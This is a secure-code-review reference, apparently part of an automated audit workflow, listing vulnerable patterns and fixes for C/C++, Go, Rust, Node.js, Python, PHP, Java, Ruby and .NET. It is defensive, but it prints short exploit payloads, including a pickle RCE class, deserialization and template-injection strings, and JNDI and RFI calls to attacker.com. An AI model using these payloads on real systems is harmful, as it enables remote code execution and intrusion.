# Language-Specific Vulnerability Reference

Load this file during Phase 8. Read only the section(s) matching detected languages.

---

## Table of Contents
1. C / C++
2. Go
3. Rust
4. JavaScript / TypeScript / Node.js
5. Python
6. PHP
7. Java / JVM
8. Ruby
9. .NET / C#

---

## 1. C / C++

| Vulnerability | Dangerous Pattern | Safe Alternative |
|---|---|---|
| Buffer overflow | `strcpy`, `strcat`, `sprintf`, `gets`, `scanf("%s")` | `strncpy`+null-terminate, `snprintf`, `fgets` |
| Integer overflow | Unchecked arithmetic before size/allocation | `__builtin_add_overflow`, explicit range check |
| Use-After-Free | Pointer access after `free()`/`delete` | Smart pointers, nullify after free |
| Double-free | `free()` called twice on same pointer | Single-owner patterns, smart pointers |
| Format string | `printf(user_input)` — no format arg | Always `printf("%s", user_input)` |
| Uninitialized read | Stack/heap read before write | Zero-initialize allocations |
| Null pointer deref | Unchecked `malloc()`/`calloc()` return | Always check return value |
| Heap overflow | Off-by-one in loop writing to heap buffer | Careful bounds, bounded loops |

**Analysis protocol:**
1. Run `grep` for all dangerous function calls in the codebase
2. For each: trace back to nearest user-controlled size or string input
3. Determine if length can be attacker-controlled beyond buffer bounds

---

## 2. Go

**Race conditions:**
- Shared state (maps, slices, structs) accessed from multiple goroutines without `sync.Mutex`,
  `sync.RWMutex`, or `sync/atomic`
- Signal: `go func()` closures capturing and modifying outer variables
- Detection equivalent: `-race` flag; look for goroutines sharing mutable state

**Integer overflow:**
- Go has no runtime overflow check (silent wraparound)
- Flag: arithmetic on externally-controlled values used as: buffer sizes, array indices,
  loop bounds, allocation arguments
- Safe: `math/bits.Add64` overflow-detecting variants, explicit range checks before use

**Nil pointer dereference:**
- Interface holding nil concrete value — type assertion succeeds, method call panics
- Unchecked error returns: `val, _ := someFunc()` then `val.Method()` — if error path
  sets val to nil, dereference panics → DoS

**Goroutine leaks:**
- Goroutine started, channel never closed or context never cancelled → memory/fd exhaustion
- Pattern: `go func() { for { select { case v := <-ch: ... } } }()` with ch never closed

**`encoding/gob` with interface types:**
- `gob.Decode` into `interface{}` can instantiate arbitrary registered types
- Remote attacker controlling gob payload can trigger arbitrary type instantiation

**`os/exec` with shell:**
```go
// NEVER
exec.Command("sh", "-c", userInput)

// Safe
exec.Command("binary", "--flag", userInput)  // args as separate elements
```

---

## 3. Rust

**`unsafe` block audit (every block must be justified):**
- Pointer arithmetic: verify no out-of-bounds dereference
- Lifetime violations: `'static` transmutation of non-static references
- Aliasing: mutable reference and any other reference to same data simultaneously
- `std::mem::transmute`: unsound type reinterpretation — verify sizes match AND alignment correct

**Integer overflow:**
- Release builds: wrapping behavior (no panic)
- Flag: arithmetic on externally-controlled values → `checked_add()`, `checked_mul()`,
  `saturating_add()`, or `wrapping_add()` with documented intent

**Panic as DoS:**
- `unwrap()`, `expect()` on untrusted input → panic → process restart / service disruption
- All I/O, parsing, and user-controlled value handling must use `Result`/`Option` with
  graceful error handling, never `unwrap()` in production paths

**`std::str::from_utf8_unchecked`:**
- Unsafe; if input not validated → undefined behavior reading invalid UTF-8

---

## 4. JavaScript / TypeScript / Node.js

**Prototype Pollution:**

Dangerous merge patterns:
```javascript
// lodash < 4.17.12 -- vulnerable
_.merge(target, userControlledObject)
_.extend(target, userControlledObject)

// Manual deep merge -- vulnerable if not guarded
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') merge(target[key], source[key])
    else target[key] = source[key]  // key = "__proto__" → pollutes Object.prototype
  }
}
```

Exploit chain:
```javascript
// Attacker payload
{"__proto__": {"polluted": "value"}}
// OR
{"constructor": {"prototype": {"polluted": "value"}}}

// If polluted property reaches exec/spawn:
{"__proto__": {"shell": "/bin/sh", "env": {"EVIL": "payload"}}}
```

Detection: trace `JSON.parse(userInput)` → `merge()` / `assign()` / `extend()` → any
property eventually passed to `child_process.exec`, `eval`, template engine.

Safe merge: `Object.assign({}, source)` (shallow only), or use `lodash.merge` ≥ 4.17.12
with prototype pollution protection.

**Dynamic `require` / `import`:**
```javascript
// Vulnerable — user controls module name
const module = require(userInput)
const handler = require(`./handlers/${req.params.type}`)

// Attack: ../../../../etc/passwd or path to writable attacker file
```

**`eval()` / `Function()` / `vm.runInThisContext()`:**
- Explicit code execution sinks; any user-controlled string → RCE
- `vm` sandbox is NOT a security boundary — `vm.runInThisContext` can escape

**Insecure deserialization:**
- `node-serialize`: `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}"`
- `serialize-javascript` with `{iife: true}`: IIFE functions auto-executed on deserialize

**`setTimeout` / `setInterval` with string argument:**
```javascript
setTimeout("eval(userInput)", 1000)  // equivalent to eval()
```

---

## 5. Python

**`pickle.loads()` / `marshal.loads()`:**
```python
import pickle, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
pickle.loads(payload)  # executes os.system('id')
```
Never deserialize pickle from untrusted source. Use JSON + schema validation.

**`yaml.load()` without SafeLoader:**
```python
# Vulnerable
yaml.load(user_input)  # Python 2 / PyYAML < 6
yaml.load(user_input, Loader=yaml.FullLoader)  # still exploitable in some versions

# Safe
yaml.safe_load(user_input)
yaml.load(user_input, Loader=yaml.SafeLoader)

# Payload example (Python object instantiation):
# !!python/object/apply:os.system ['id']
```

**`eval()` / `exec()` / `compile()`:**
- Direct code execution; any user-controlled string → RCE
- Also: `ast.literal_eval` is safe (literals only); `eval` is not

**`assert` for security checks:**
```python
assert user.is_admin(), "Access denied"  # STRIPPED in python -O (optimized mode)
```
Never use `assert` for authorization or validation; use explicit `if` + raise.

**`subprocess` with `shell=True`:**
```python
# Vulnerable
subprocess.call(f"convert {filename} output.png", shell=True)

# Safe
subprocess.call(["convert", filename, "output.png"])
```

**XML parsing:**
- `xml.etree.ElementTree`: no XXE support (safe from XXE but no DTD validation either)
- `lxml`: supports XXE if `resolve_entities=True` (default False — verify)
- `xml.sax`: vulnerable to XXE by default → use `defusedxml`
- Rule: always use `defusedxml` for untrusted XML input

**Integer / float precision:**
- Arbitrary precision integers: no overflow, but extremely large exponents can exhaust CPU/memory
  (e.g., `2 ** (10**9)` computation)
- Flag: user-controlled exponents in arithmetic → bound before computing

---

## 6. PHP

**Type Juggling (loose comparison `==`):**
```php
// Hash prefix collision
md5("240610708") == md5("QNKCDZO")  // both start with "0e..." → equal in loose comparison
"0e1234" == "0e5678"  // true — scientific notation comparison
"1" == "01"           // true
"10" == "1e1"         // true
"0" == false          // true
"" == false           // true
"0" == null           // false — but "" == null is true

// Authentication bypass example
if ($hash == $stored_hash)  // vulnerable if hash starts with "0e"
// Fix: use === (strict comparison) always for auth
```

**`unserialize()` — POP chain:**
```php
// PHP Object Injection via magic methods: __wakeup, __destruct, __toString
// Attacker crafts serialized payload that chains magic methods to:
// 1. Write to filesystem (__destruct writes file)
// 2. Execute code via include in __toString
// Tool: phpggc (PHP Generic Gadget Chains) to generate payloads
```
Fix: never call `unserialize()` on user input. Use JSON. If unavoidable, use `allowed_classes`.

**`include` / `require` with user input:**
```php
include($page . '.php');        // LFI: ../../etc/passwd%00 (null byte, PHP <5.3)
include('pages/' . $page);      // LFI via path traversal
// With allow_url_include=On: RFI via http://attacker.com/shell.txt
```

**`extract()` on user input:**
```php
extract($_GET);  // $_GET['is_admin'] = true → $is_admin = true
extract($_POST);
// Can overwrite any in-scope variable including $_SESSION, $conn, $db
```

**`assert(string)`:**
```php
assert("strpos('$str', 'value') !== false");  // If $str = "') + system('id') + ('", RCE
// Fixed in PHP 8: assert(string) deprecated — still warn on PHP 7
```

---

## 7. Java / JVM

**Deserialization Gadget Chains:**

Detection: `ObjectInputStream.readObject()` called with user-controlled data.

Common gadget libraries (check classpath):
- Apache Commons Collections 3.x / 4.x → `InvokerTransformer` chain → RCE
- Spring Framework → `JndiLocatorDelegate`, `ClassPathXmlApplicationContext`
- Groovy → `ConvertedClosure` → RCE
- Apache Commons BeanUtils → property accessor chain
- Hibernate → dynamic proxy chain

Tool: `ysoserial` generates payloads for known chains.
Mitigation: `ValidatingObjectInputStream` with explicit allowlist, or switch to JSON/Protobuf.

**SpEL (Spring Expression Language) Injection:**
```java
// Vulnerable: user input evaluated as SpEL
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(userInput);  // "T(java.lang.Runtime).getRuntime().exec('id')"
exp.getValue();
```

**OGNL Injection (Struts 2, MyBatis, FreeMarker):**
```
%{(#_='multipart/form-data').(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']...)}
```

**JNDI Injection:**
```java
// Vulnerable
InitialContext ctx = new InitialContext();
ctx.lookup(userControlledString);  // "ldap://attacker.com/Exploit"

// Also: Log4Shell triggers this path via ${jndi:ldap://...}
```
Mitigation: `com.sun.jndi.rmi.object.trustURLCodebase=false` (default in JDK 8u191+),
but bypass via local deserialization gadgets still possible.

**XXE via JAXB / SAXParser / DocumentBuilder:**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// MUST set ALL of:
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

**`Runtime.exec()` / `ProcessBuilder` with shell:**
```java
// Vulnerable
Runtime.getRuntime().exec(new String[]{"sh", "-c", userInput});

// Safe
ProcessBuilder pb = new ProcessBuilder("binary", "--flag", userInput);  // args as list
```

---

## 8. Ruby

**`Marshal.load()`:**
```ruby
# Arbitrary Ruby object instantiation → RCE via gadget chains
# Tool: universal-ruby-deserialization-gadget-chains
Marshal.load(userInput)  # NEVER on untrusted input
```
Safe alternative: JSON.parse (primitives only), MessagePack.

**ERB template injection:**
```ruby
# Vulnerable
ERB.new(userInput).result  # arbitrary Ruby code in <%= ... %> or <% ... %>
# Payload: <%= `id` %> or <%= system('id') %>
```

**Dynamic dispatch:**
```ruby
# Vulnerable
obj.send(userInput, args)         # arbitrary method call on obj
obj.public_send(userInput, args)  # limited to public methods but still dangerous
# Whitelist allowed method names explicitly
```

**`eval()` / `instance_eval()` / `class_eval()`:**
Direct code execution sinks; treat same as `eval()` in any language.

**Regex `$` vs `\z` (critical validation bypass):**
```ruby
# Ruby's $ matches END OF LINE, not end of string
"valid_value\nhttp://evil.com" =~ /\Avalid_value\z/  # => nil (correct, uses \z)
"valid_value\nhttp://evil.com" =~ /^valid_value$/    # => 0 (BYPASSED — $ matches \n boundary)

# Rule: ALWAYS use \A and \z for input validation anchors, never ^ and $
```

---

## 9. .NET / C#

**`BinaryFormatter` / `NetDataContractSerializer` / `SoapFormatter`:**
- Marked obsolete in .NET 5+; generates `SYSLIB0011` warning
- Deserializing attacker-controlled data → gadget chains → RCE
- Migration: `System.Text.Json`, `Newtonsoft.Json` with TypeNameHandling.None

**`TypeNameHandling` in Newtonsoft.Json:**
```csharp
// Vulnerable: allows attacker to specify .NET type in JSON
JsonConvert.DeserializeObject(userInput, new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All  // or Auto, Objects, Arrays
});
// Payload: {"$type":"System.Windows.Data.ObjectDataProvider,...","MethodName":"Start",...}
```
Fix: `TypeNameHandling.None` always; use custom `ISerializationBinder` if polymorphism needed.

**`XmlSerializer` / `DataContractSerializer`:**
- XML deserialization with user-controlled type → gadget chain possible
- Validate `XmlRootAttribute` and restrict input types via `known types`

**SQL injection via string concatenation:**
```csharp
// Vulnerable
var query = "SELECT * FROM users WHERE name = '" + userName + "'";
SqlCommand cmd = new SqlCommand(query, conn);

// Safe
var cmd = new SqlCommand("SELECT * FROM users WHERE name = @name", conn);
cmd.Parameters.AddWithValue("@name", userName);
```

**`Process.Start` with shell:**
```csharp
// Vulnerable
Process.Start("cmd.exe", "/c " + userInput);

// Safe
var psi = new ProcessStartInfo("binary") { ArgumentList = { "--flag", userInput } };
Process.Start(psi);
```

**LDAP injection in `DirectorySearcher`:**
```csharp
// Vulnerable
searcher.Filter = "(&(objectClass=user)(samAccountName=" + username + "))";
// Payload: *)(|(password=*)
// Safe: escape with: username.Replace("*","\\2a").Replace("(","\\28")...
// Or use DirectoryEntry with parameterized filters
```
